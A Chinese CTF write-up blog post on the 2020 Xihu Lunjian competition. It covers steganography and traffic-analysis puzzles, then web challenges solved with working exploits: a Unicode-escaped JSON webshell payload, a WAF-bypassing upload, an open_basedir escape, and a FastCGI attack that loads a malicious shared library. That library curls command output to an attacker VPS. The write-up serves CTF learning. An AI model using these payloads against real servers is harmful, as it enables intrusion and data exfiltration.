---
title: 2020西湖论剑部分复现+另外几道Web题
date: 2020-10-13 22:10:22
categories:
  - CTF
---

西湖论剑题目质量算挺高的了，是那种贴近真实环境的题目，以至于质量高到完全看不懂（除了Misc感觉比较离谱

下面都是赛后复现了，比赛的时候还是开心的签了一下到，总结：比赛体验很不错，网速很给力，下次还来

<!-- more -->

# Misc

## yusa_yyds

附件下载：[链接](https://o.hujiekang.top/downloads/0ee265de8929e92360337fcdeb426b8d.zip)

是一个Wireshark流量文件，打开一看是USB数据包。比赛的时候搜了半天只找到了键盘和鼠标的东西，赛后看wp发现是Xbox 360手柄。。。

那是怎么找到的呢？下面是对着WP+自己找的资料进行的总结：

首先是USB的地址格式：

> 摘自https://bbs.zafu-polaris.cn/d/13-2020-usbyusa-yyds
>
> 常见地址格式为 X.Y.Z
>
> - X表示USB总线ID
>   - 对应的过滤值为`usb.bus_id`
> - Y表示USB设备ID
>   - 对应的过滤值为`usb.device_address`
> - Z表示USB设备的端口


所以从流量包的前一段很容易发现是在读取USB设备列表，因为每次`GET DESCRIPTOR`的地址都不同。然后搜索发现在`GET DESCRIPTOR Response DEVICE`返回的是设备的类型，包含设备生产商、设备名称等信息：

![](https://hujiekang.top/images/uploads/big/72eab3dc871aa67e6b0e146906274cbd.png)

由于后面的数据包传输对象地址都是`2.15.2`，所以只需要关注`2.15`开头的设备即可。可以看见`2.15.0`的`GET DESCRIPTOR Response DEVICE`返回值里面出现了Microsoft和Xbox360 Controller字样。所以可以确定后续的数据包都是Xbox360手柄产生的。

然后开始查看传输的数据包。关注每个数据包的LCD（Leftover Capture Data），可以发现大体的数据包格式：`000800ff00000000`和`0008000000000000`，然后从[这个链接](https://www.partsnotincluded.com/understanding-the-xbox-360-wired-controllers-usb-data/)中找到了Xbox360传输数据包的格式，发现这是震动的数据包，下面是网站中的说明：

![](https://hujiekang.top/images/uploads/medium/2508f829ecf0553ec23599c5ffb5e8e3.jpg)

> A type byte of ‘0x00’ indicates a rumble packet. The controller contains two rumble motors: a large weight in the left grip and a small weight in the right grip. The value for both of these motors is updated in a single packet.
> The rumble values are 8-bit unsigned integers representing the motor speed, where ‘0’ is off and ‘255’ is max speed. The left motor’s rumble value is stored in index 3, while the right motor’s rumble value is stored in index 4.
> This packet is typically 8 bytes long, with bytes 2, 5, 6, and 7 unused (0x00).


综上，字节4是左边震动马达的马达转速数据，0代表关闭，255代表最大速度。所以一对`000800ff00000000`和`0008000000000000`对应的就是一次震动。

再次看流量包，就会发现有几次震动之间的间隔比较大，所以应该可以按这个间隔来对数据进行分组，通过查看震动次数获得想要的数据。

分割时间段`15.74~15.99`、`18.28~18.53`、`20.83~22.70`、`25.01~27.44`、`29.74~29.98`、`32.28~34.17`，对应震动次数1、1、4、5、1、4。结合hint，flag就是`md5(114514)`。

PS：后面看WP发现通过Wireshark I/O图表可以更直观的看出来（两个坡峰算一次震动）：

![](https://hujiekang.top/images/uploads/big/f12daec911d0ab9d631aaae4e841a43f.png)

## Yusa

题目链接：<http://yusa-papa.7bf48c.challenge.gcsis.cn/index.html>

全部题目附件：[downloads/9745fe900dbb625aaf893e3d219d5e31.zip](https://o.hujiekang.top/downloads/9745fe900dbb625aaf893e3d219d5e31.zip)

首先在源代码里面找到一段文字：

> Maybe these texts are really helpful for you
> Biometric list is OK!
> endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack


由Biometric list搜索得到[PGP词汇表](https://zh.wikipedia.org/wiki/PGP%E8%AF%8D%E6%B1%87%E8%A1%A8)，PGP词汇表（即“良好隐私密码法词汇表”，又称生物识别词汇表）是一个通过声音频道传输[字节](https://zh.wikipedia.org/wiki/字节)时使用的词汇表，目的是清晰表达内容。写了个脚本解码：

```python
wordlist = {"aardvark":0x00,"absurd":0x01,"accrue":0x02,"acme":0x03,"adrift":0x04,"adult":0x05,"afflict":0x06,"ahead":0x07,"aimless":0x08,"Algol":0x09,"allow":0x0A,"alone":0x0B,"ammo":0x0C,"ancient":0x0D,"apple":0x0E,"artist":0x0F,"assume":0x10,"Athens":0x11,"atlas":0x12,"Aztec":0x13,"baboon":0x14,"backfield":0x15,"backward":0x16,"banjo":0x17,"beaming":0x18,"bedlamp":0x19,"beehive":0x1A,"beeswax":0x1B,"befriend":0x1C,"Belfast":0x1D,"berserk":0x1E,"billiard":0x1F,"bison":0x20,"blackjack":0x21,"blockade":0x22,"blowtorch":0x23,"bluebird":0x24,"bombast":0x25,"bookshelf":0x26,"brackish":0x27,"breadline":0x28,"breakup":0x29,"brickyard":0x2A,"briefcase":0x2B,"Burbank":0x2C,"button":0x2D,"buzzard":0x2E,"cement":0x2F,"chairlift":0x30,"chatter":0x31,"checkup":0x32,"chisel":0x33,"choking":0x34,"chopper":0x35,"Christmas":0x36,"clamshell":0x37,"classic":0x38,"classroom":0x39,"cleanup":0x3A,"clockwork":0x3B,"cobra":0x3C,"commence":0x3D,"concert":0x3E,"cowbell":0x3F,"crackdown":0x40,"cranky":0x41,"crowfoot":0x42,"crucial":0x43,"crumpled":0x44,"crusade":0x45,"cubic":0x46,"dashboard":0x47,"deadbolt":0x48,"deckhand":0x49,"dogsled":0x4A,"dragnet":0x4B,"drainage":0x4C,"dreadful":0x4D,"drifter":0x4E,"dropper":0x4F,"drumbeat":0x50,"drunken":0x51,"Dupont":0x52,"dwelling":0x53,"eating":0x54,"edict":0x55,"egghead":0x56,"eightball":0x57,"endorse":0x58,"endow":0x59,"enlist":0x5A,"erase":0x5B,"escape":0x5C,"exceed":0x5D,"eyeglass":0x5E,"eyetooth":0x5F,"facial":0x60,"fallout":0x61,"flagpole":0x62,"flatfoot":0x63,"flytrap":0x64,"fracture":0x65,"framework":0x66,"freedom":0x67,"frighten":0x68,"gazelle":0x69,"Geiger":0x6A,"glitter":0x6B,"glucose":0x6C,"goggles":0x6D,"goldfish":0x6E,"gremlin":0x6F,"guidance":0x70,"hamlet":0x71,"highchair":0x72,"hockey":0x73,"indoors":0x74,"indulge":0x75,"inverse":0x76,"involve":0x77,"island":0x78,"jawbone":0x79,"keyboard":0x7A,"kickoff":0x7B,"kiwi":0x7C,"klaxon":0x7D,"locale":0x7E,"lockup":0x7F,"merit":0x80,"minnow":0x81,"miser":0x82,"Mohawk":0x83,"mural":0x84,"music":0x85,"necklace":0x86,"Neptune":0x87,"newborn":0x88,"nightbird":0x89,"Oakland":0x8A,"obtuse":0x8B,"offload":0x8C,"optic":0x8D,"orca":0x8E,"payday":0x8F,"peachy":0x90,"pheasant":0x91,"physique":0x92,"playhouse":0x93,"Pluto":0x94,"preclude":0x95,"prefer":0x96,"preshrunk":0x97,"printer":0x98,"prowler":0x99,"pupil":0x9A,"puppy":0x9B,"python":0x9C,"quadrant":0x9D,"quiver":0x9E,"quota":0x9F,"ragtime":0xA0,"ratchet":0xA1,"rebirth":0xA2,"reform":0xA3,"regain":0xA4,"reindeer":0xA5,"rematch":0xA6,"repay":0xA7,"retouch":0xA8,"revenge":0xA9,"reward":0xAA,"rhythm":0xAB,"ribcage":0xAC,"ringbolt":0xAD,"robust":0xAE,"rocker":0xAF,"ruffled":0xB0,"sailboat":0xB1,"sawdust":0xB2,"scallion":0xB3,"scenic":0xB4,"scorecard":0xB5,"Scotland":0xB6,"seabird":0xB7,"select":0xB8,"sentence":0xB9,"shadow":0xBA,"shamrock":0xBB,"showgirl":0xBC,"skullcap":0xBD,"skydive":0xBE,"slingshot":0xBF,"slowdown":0xC0,"snapline":0xC1,"snapshot":0xC2,"snowcap":0xC3,"snowslide":0xC4,"solo":0xC5,"southward":0xC6,"soybean":0xC7,"spaniel":0xC8,"spearhead":0xC9,"spellbind":0xCA,"spheroid":0xCB,"spigot":0xCC,"spindle":0xCD,"spyglass":0xCE,"stagehand":0xCF,"stagnate":0xD0,"stairway":0xD1,"standard":0xD2,"stapler":0xD3,"steamship":0xD4,"sterling":0xD5,"stockman":0xD6,"stopwatch":0xD7,"stormy":0xD8,"sugar":0xD9,"surmount":0xDA,"suspense":0xDB,"sweatband":0xDC,"swelter":0xDD,"tactics":0xDE,"talon":0xDF,"tapeworm":0xE0,"tempest":0xE1,"tiger":0xE2,"tissue":0xE3,"tonic":0xE4,"topmost":0xE5,"tracker":0xE6,"transit":0xE7,"trauma":0xE8,"treadmill":0xE9,"Trojan":0xEA,"trouble":0xEB,"tumor":0xEC,"tunnel":0xED,"tycoon":0xEE,"uncut":0xEF,"unearth":0xF0,"unwind":0xF1,"uproot":0xF2,"upset":0xF3,"upshot":0xF4,"vapor":0xF5,"village":0xF6,"virus":0xF7,"Vulcan":0xF8,"waffle":0xF9,"wallet":0xFA,"watchword":0xFB,"wayside":0xFC,"willow":0xFD,"woodlark":0xFE,"Zulu":0xFF}
s = "endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack"

s_list = s.split(' ')
print("".join([chr(wordlist[each]) for each in s_list]))
```

输出结果：

> You can see my collection puzzles in /hint.rar and another /encode.png.
> By the way,the picture shoud be used
> "Yusa" is very important in this challenge!!

于是可以提取出下面的信息

- hint.rar、encode.png
- 网页中的图片有用
- "Yusa"很关键

网页中的图片是一张webp图片，于是想到webp隐写，可以用stegpy直接求解：

```
❯❯ stegpy.exe encode.webp
the_password_is:Yus@_1s_YYddddsstegpy encode.webp the_key_is:Yus@_yydsstegpy!!
```

然后得到rar的密码，解压后得到hint.jpg，同时rar还给了一个hint：利用一种较为古老和不常见的工具。USE your google and Baidu

结合一下，一种图片隐写工具，但是较为古老不是很常见，最后在[这里](https://www.greycampus.com/blog/information-security/top-must-have-tools-to-perform-steganography)找到工具**Invisible Secrets 4**，解密算法一个一个试，最后可以使用Blowfish算法成功解密，密钥为Yusa，得到flag加密算法encode.py：

```python
import os,random
from PIL import Image,ImageDraw

p=Image.open('flag.png').convert('L')
flag = []
a,b = p.size
for x in range(a):
    for y in range(b):
        if p.getpixel((x,y)) == 255:
            flag.append(0)
        else:
            flag.append(1)

key1stream = []
for _ in range(len(flag)):
    key1stream.append(random.randint(0,1))
random.seed(os.urandom(8))
key2stream = []
for _ in range(len(flag)):
    key2stream.append(random.randint(0,1))
enc = []
for i in range(len(flag)):
    enc.append(flag[i]^key1stream[i]^key2stream[i])

hide=Image.open('source.png').convert('RGB')
R=[]
G=[]
B=[]
a,b = hide.size
for x in range(a):
    for y in range(b):
        R.append(bin(hide.getpixel((x,y))[0]).replace('0b','').zfill(8))
        G.append(bin(hide.getpixel((x, y))[1]).replace('0b','').zfill(8))
        B.append(bin(hide.getpixel((x, y))[2]).replace('0b','').zfill(8))
R1=[]
G1=[]
B1=[]
for i in range(len(key1stream)):
    if key1stream[i] == 1:
        R1.append(R[i][:7]+'1')
    else:
        R1.append(R[i][:7]+'0')

for i in range(len(key2stream)):
    if key2stream[i] == 1:
        G1.append(G[i][:7]+'1')
    else:
        G1.append(G[i][:7]+'0')

for i in range(len(enc)):
    if enc[i] == 1:
        B1.append(B[i][:7]+'1')
    else:
        B1.append(B[i][:7]+'0')

for r in range(len(R)):
    R[r] = int(R1[r],2)

for g in range(len(G)):
    G[g] = int(G1[g],2)

for b in range(len(B)):
    B[b] = int(B1[b],2)

a,b = hide.size
en_p = Image.new('RGB',(a,b),(255,255,255))
for x in range(a):
    for y in range(b):
        en_p.putpixel((x,y),(R[y+x*b],G[y+x*b],B[y+x*b]))

en_p.save('encode.png')
```

很容易知道是LSB隐写，将每个R、G、B值的最低位异或得到的值以黑白形式输出即可。所以只需要提取encode.png中每一个像素RGB的最低位异或值，再输出为黑白图片即可。下面是exp：

```python
from PIL import Image,ImageDraw
p = Image.open('encode.png').convert('RGB')
a,b = p.size
R=[]
G=[]
B=[]
for x in range(a):
    for y in range(b):
        R.append(bin(p.getpixel((x,y))[0]).replace('0b','').zfill(8))
        G.append(bin(p.getpixel((x, y))[1]).replace('0b', '').zfill(8))
        B.append(bin(p.getpixel((x, y))[2]).replace('0b', '').zfill(8))

R1=[]
G1=[]
B1=[]
flag=[]
for i in range(len(R)):
    R1.append(int(R[i][-1:]))
    G1.append(int(G[i][-1:]))
    B1.append(int(B[i][-1:]))
print(R1[100:150])
print(G1[100:150])
print(B1[100:150])
for i in range(len(R1)):
    # print(B1[i]^G1[i]^R1[i], end="")
    flag.append(B1[i]^G1[i]^R1[i])
print(flag[100:150])
de_p = Image.new('L',(a,b),255)
c=0

for x in range(a):
    for y in range(b):
        if flag[c] == 1:
            de_p.putpixel((x,y),0)
        else:
            de_p.putpixel((x, y), 255)
        c=c+1

de_p.save('out.png')
```

输出结果：

![](https://hujiekang.top/images/uploads/medium/9e42debcdbf5e7ba4217c1ea8fc27803.png)

## Barbar

附件下载：[链接](https://o.hujiekang.top/downloads/ea3dc39ca0b2f6b5f17abddec1f0e9a4.png)

打开是一张二维码，扫描结果为“密‍‌﻿‍﻿﻿﻿‎‌‍‌‏﻿‎‍‍‎‌‌‍‏‍‌‎﻿‌﻿‍﻿‌‍‌‍﻿‎‌﻿‍‏﻿‍﻿‍‎﻿‌‎﻿‌‍‌﻿‌‌‌‏‌‌‎‎‍‌﻿‌‍‏‌﻿‏‌‍‎‍﻿‍﻿﻿‏‍‏‌﻿﻿‏‍‌‌‍‎‍‍‎﻿‍‎﻿码是在哪啊”，查看源数据发现不对劲：

![](https://hujiekang.top/images/uploads/big/ccbe19500a6e2164d576d04b8dd90c9e.png)

发现是零宽字节隐写，丢进[在线网站](https://yuanfux.github.io/zero-width-web/)解，得到一串字符`YcfVgMBUraXftwO6Cp92YBGAbyRyWNOO`。

然后把这个二维码丢进Stegsolve发现有ZIP数据：

![](https://hujiekang.top/images/uploads/big/00ec93f320bc0c05a4da633eb05713ca.png)

提取出来解压，得到一个Word文档和一张图片。Word文档改后缀解压后到处翻，在`/word/document.xml`里面找到了一堆Base64数据，解码发现是PNG：

![](https://hujiekang.top/images/uploads/big/d64c279b705d79208aaf4255046f1fe2.png)

然后导出来得到下面的图片：

![](https://hujiekang.top/images/uploads/big/38088fd5f3f1ea7aebdad1c774b8f45b.png)

结合题目名称，发现是一种条形码（参考<https://en.wikipedia.org/wiki/Barcode>）

找一个解码器，解码出结果``di`f{e1c64e14db14c6bb8faabab5bd7be1dc}``。

此时还有另一张图片没用，官方WP中给出的是npiet，是一种图片编程语言，官网<http://www.bertnase.de/npiet>。看了之后发现这种编程语言分为有输入和无输入两种执行类型，于是<http://www.bertnase.de/npiet/npiet-execute.php>上传图片，input填入上面的结果，输出即为flag：

![](https://hujiekang.top/images/uploads/big/30183eb0f940648aa0cc0d3b43075347.png)

# Web

## easyJson

题目链接：<http://easyjson.xhlj.wetolink.com/>

首先给出源码：

```php
 <?php
include 'security.php';

if(!isset($_GET['source'])){
    show_source(__FILE__);
    die();
}
$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';
var_dump($sandbox);
if(!file_exists($sandbox)){
    mkdir($sandbox);
    file_put_contents($sandbox."index.php","<?php echo 'Welcome To Dbapp OSS.';?>");
}
$action = $_GET['action'];
$content = file_get_contents("php://input");


if($action == "write" &&  SecurityCheck('filename',$_GET['filename']) &&SecurityCheck('content',$content)){
    $content = json_decode($content);
    $filename = $_GET['filename'];
    $filecontent = $content->content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent."\n Powered By Dbapp OSS.");
}elseif($action == "reset"){
    $files = scandir($sandbox);
    foreach($files as $file) {
        if(!is_dir($file)){
            if($file !== "index.php"){
                unlink($sandbox.$file);
            }
        }
    }
}
else{
    die('Security Check Failed.');
}
```

从代码中很容易看出有一个任意写的地方，就是在下面if语句的里面，它会把POST区域的数据当作JSON进行解析，然后把对应的内容写入你给定的文件名里面。所以关键在于if条件里面的两个SecurityCheck，只需要绕过它们就能够成功写入内容。但因为SecurityCheck具体的内容是不知道的，所以只能一点一点试。

首先固定`content`为空，即`{}`，可以发现文件名的参数应该是很好绕过了，fuzz一下可以发现数字和大写字母以及特殊字符是被ban了，只要文件名为纯小写字母即可（后面又试了一下发现可以带`.`，也就是可以带后缀名）；

然后是文件内容，首先输入`{"content":""}`，发现直接报错（这里吐槽一波Hackbar，会在我输入的JSON里面加一些莫名其妙的项，还是Burp靠谱），初步猜测可能是ban了`content`关键字，然后找了一下，发现JSON支持Unicode，于是试一波Unicode编码，发现可以成功绕过：

![](https://hujiekang.top/images/uploads/big/ae6f56d596474b22ada5cf2884e08372.png)

然后愉快的写马，然后愉快的执行命令，最终执行根目录下的readflag即可获得flag

Payload：`{"\u0063\u006f\u006e\u0074\u0065\u006e\u0074": "\u003c\u003f\u0070\u0068\u0070\u0020\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0027\u002f\u0072\u0065\u0061\u0064\u0066\u006c\u0061\u0067\u0027\u0029\u003b\u0020\u003f\u003e"}`

![](https://hujiekang.top/images/uploads/big/a9259a86b276b33dfca61ff6efe61de6.png)

## NewUpload

题目链接：<http://newupload.xhlj.wetolink.com/>

这题的重点在于宝塔WAF绕过，需要绕过`open_basedir`和`disable_functions`

打开题目就一个上传的界面，整个网站应该都是被宝塔挡住的，如果触发了WAF服务器会无响应，尝试了文件后缀大小写、双写都不行，后面发现换行符`.p\nh\np`可以绕过。

然后是文件内容，经过尝试，好像如果检测到是纯文本就会有过滤，然后在马前面套一个PNG头上去没问题了：

![](https://hujiekang.top/images/uploads/big/21b5e6c69827882b98e6a45afe8d727c.png)

这里的一句话不能写eval那种的，因为宝塔也会检测参数输入，所以没办法整。

然后RCE，发现system被ban了，查看`phpinfo()`发现disable_functions和open_basedir都设置了，就意味着现在无法逃逸出当前目录，而且系统函数也无法使用。所以需要绕过。但是由于putenv也被ban了，所以之前的利用`LD_PRELOAD`的绕过也没办法用了。

### 绕过`open_basedir`

那么首先绕过一下open_basedir探测一下目录，可以参考[这篇文章](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)，有很多种方法，列的比较全面了。然后随便写个程序传上去：

```php
<?php
mkdir('h');chdir('h');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');var_dump(scandir($_GET['hhh']));
```

读到根目录，发现flag和readflag，说明还是要执行系统命令才能读到flag：

![](https://hujiekang.top/images/uploads/big/345e2ba66d0440a41ab49d9d7660dae7.png)

### 绕过`disable_functions`

所以接下来就绕过disable_functions。由于`LD_PRELOAD`莫得用了，那么只能另想办法。看见P神的文章<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html>，可以使用PHP-FPM/FastCGI来绕过disable_functions，原理是PHP-FPM/FastCGI中的环境变量`PHP_VALUE`和`PHP_ADMIN_VALUE`可以直接修改PHP的配置内容，由于PHP-FPM/FastCGI不会验证请求的来源，所以通过直接访问PHP-FPM/FastCGI并发送修改配置信息的请求就可以修改对应的配置信息。P神给出的一个办法是设置`extension`项为自定义项，然后上传一个自定义的共享链接库，来达到调用的目的。

当然不是随便写就能调用的了，这里需要用到C语言的一个attribute：`__attribute__ ((__constructor__))`这个attribute的作用和构造函数差不多，下面是GNU官方解释：

> The `constructor` attribute causes the function to be called automatically before execution enters `main()`.

所以我们就要利用这样的特性写一个函数，它被PHP加载之后将会被自动执行。下面是C代码：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
__attribute__ ((__constructor__)) void preload (void)
{
    system("curl vps:port/`/readflag`");
}
```

使用gcc编译成共享链接库.so文件：`gcc 1.c -fPIC -shared -o 1.so`

然后想办法传到目标机器上面去。刚刚探测目录发现除了自己本身的目录外还有`/tmp`可写，所以写文件的地方是有的。然后通过设置`allow_url_include = On`可以使用URL远程包含文件，就这样使用PHP的`copy()`函数可以把共享库保存下来：

```php
<?php copy('http://vps:port/so.so', '/tmp/so.so');
```

那么这些问题都解决了，就剩下如何把我们的请求打到PHP-FPM/FastCGI上面去了。

可行的有两种办法：Unix Domain Socket和TCP，前者是 UNIX 系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket 描述符文件就可以建立通道进行通信了；后者是php-fpm 进程会监听本机上的一个端口(默认 9000)，然后 nginx 会把客户端数据通过 fastcgi 协议传给 9000 端口，php-fpm 拿到数据后会调用 cgi 进程解析。

然后可以在`/tmp`里面找到`/tmp/php-cgi-74.sock`文件，所以我们选择第一种方式进行访问。这里参考了P神的网站[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)，由于他写的脚本是打内网用的，所以我修改了一下直接生成Payload而不是直接去访问CGI服务：

```python
import random
import sys
import urllib.parse

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def getPayload(self, nameValuePairs={}, post=''):
        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
        return request

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    client = FastCGIClient("127.0.0.1", 9999, 3, 0)
    params = dict()
    documentRoot = "/var/www/html"
    uri = "/var/www/htmlindex.php"
    content = "<?php phpinfo(); ?>"
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'extension = /tmp/so.so'
    }
    response = client.getPayload(params, content)
    print(urllib.parse.quote(response))
```

修改参数列表里面的值就可以实现Payload的生成，然后在自己的VPS上面开一个Web服务把`.so`文件挂在上面，顺便可以用来接收打回来的请求。下面是最终的exp：

```php
<?php
// 绕过open_basedir
mkdir('h');chdir('h');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
// 复制.so文件到指定位置
var_dump(copy("http://vps:port/so.so","/www/wwwroot/10.20.124.208/sandbox/i042dbgf6g89h9bc2cati1jgjv/upload/so.so"));
// 创建套接字发送Payload到FastCGI
$fp = stream_socket_client("unix:///tmp/php-cgi-74.sock", $errno, $errstr,30);$out = urldecode("%01%01%F5%D3%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F5%D3%01%F0%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%22SCRIPT_FILENAME/var/www/htmlvar/www/htmlindex.php%0B%16SCRIPT_NAME/var/www/htmlindex.php%0C%00QUERY_STRING%0B%16REQUEST_URI/var/www/htmlindex.php%0D%0DDOCUMENT_ROOT/var/www/html%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH19%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%16PHP_ADMIN_VALUEextension%20%3D%20/www/wwwroot/10.20.124.208/sandbox/i042dbgf6g89h9bc2cati1jgjv/upload/so.so%01%04%F5%D3%00%00%00%00%01%05%F5%D3%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%F5%D3%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) {echo htmlspecialchars(fgets($fp, 10)); }fclose($fp);
```

里面的`extension`项的位置要和上面copy的位置一致，不然会出现找不到的情况，也就不能执行命令了。

然后上传访问，最终在VPS上获得了flag（之前的命令是curl，所以flag是通过curl打回来的）：

![](https://hujiekang.top/images/uploads/big/d28165a10121a8dc05c73886d3acc304.png)

当然也可以将flag写入一个文件，然后再去读取（反正都任意命令执行了

这题有意思的，学了好多东西

